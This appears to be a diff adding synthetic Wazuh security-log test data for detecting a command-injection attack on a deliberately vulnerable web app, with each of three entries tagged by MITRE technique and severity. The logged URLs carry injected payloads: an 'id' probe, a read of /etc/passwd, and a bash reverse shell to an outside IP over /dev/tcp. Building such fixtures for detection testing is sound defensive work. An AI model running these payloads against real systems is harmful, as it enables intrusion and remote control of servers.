@@ -1,0 +1,202 @@
+{
+  "_metadata": {
+    "attack_id": "T1190.002",
+    "variation": "001",
+    "name": "Exploit Public-Facing Application: Command Injection",
+    "description": "OS command injection in vulnerable web application for remote code execution",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "initial-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Web server - Command injection probe",
+      "sequence": 1,
+      "timestamp": "2026-02-10T21:20:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T21:20:00.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Web Attack - Command Injection Detected",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1190",
+              "T1190.002"
+            ],
+            "tactic": [
+              "Initial Access"
+            ],
+            "technique": [
+              "Exploit Public-Facing Application",
+              "Command Injection"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "web",
+            "attack",
+            "command_injection"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1710000011.000001",
+        "decoder": {
+          "name": "json"
+        },
+        "location": "/var/log/docker/mutillidae/access.log",
+        "data": {
+          "srcip": "185.220.101.50",
+          "id": "185.220.101.50",
+          "url": "/index.php?page=dns-lookup.php&target_host=8.8.8.8;id",
+          "httpmethod": "GET",
+          "protocol": "HTTP/1.1",
+          "status": "200",
+          "response_time": "0.567",
+          "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
+          "attack_pattern": "COMMAND_INJECTION"
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": 31,
+        "fomorian_batch": 12
+      }
+    },
+    {
+      "_comment": "Web server - Command injection with data exfiltration",
+      "sequence": 2,
+      "timestamp": "2026-02-10T21:20:15.000Z",
+      "log": {
+        "timestamp": "2026-02-10T21:20:15.000Z",
+        "rule": {
+          "level": 14,
+          "description": "Web Attack - Command Injection Remote Code Execution",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1190",
+              "T1190.002",
+              "T1059.004"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Execution"
+            ],
+            "technique": [
+              "Exploit Public-Facing Application",
+              "Command Injection",
+              "Unix Shell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "web",
+            "attack",
+            "command_injection",
+            "rce"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1710000011.000002",
+        "decoder": {
+          "name": "json"
+        },
+        "location": "/var/log/docker/mutillidae/access.log",
+        "data": {
+          "srcip": "185.220.101.50",
+          "id": "185.220.101.50",
+          "url": "/index.php?page=dns-lookup.php&target_host=8.8.8.8;cat%20/etc/passwd",
+          "httpmethod": "GET",
+          "protocol": "HTTP/1.1",
+          "status": "200",
+          "response_time": "0.823",
+          "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
+          "attack_pattern": "COMMAND_INJECTION_DATA_EXFIL"
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": 31,
+        "fomorian_batch": 12
+      }
+    },
+    {
+      "_comment": "Web server - Command injection reverse shell attempt",
+      "sequence": 3,
+      "timestamp": "2026-02-10T21:20:30.000Z",
+      "log": {
+        "timestamp": "2026-02-10T21:20:30.000Z",
+        "rule": {
+          "level": 15,
+          "description": "Web Attack - Command Injection Reverse Shell Attempt",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1190",
+              "T1190.002",
+              "T1059.004"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Execution"
+            ],
+            "technique": [
+              "Exploit Public-Facing Application",
+              "Command Injection",
+              "Unix Shell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "web",
+            "attack",
+            "command_injection",
+            "reverse_shell"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1710000011.000003",
+        "decoder": {
+          "name": "json"
+        },
+        "location": "/var/log/docker/mutillidae/access.log",
+        "data": {
+          "srcip": "185.220.101.50",
+          "id": "185.220.101.50",
+          "url": "/index.php?page=dns-lookup.php&target_host=8.8.8.8;bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/185.220.101.50/4444%200%3E%261'",
+          "httpmethod": "GET",
+          "protocol": "HTTP/1.1",
+          "status": "200",
+          "response_time": "2.145",
+          "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
+          "attack_pattern": "COMMAND_INJECTION_REVERSE_SHELL"
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": 31,
+        "fomorian_batch": 12
+      }
+    }
+  ]
+}
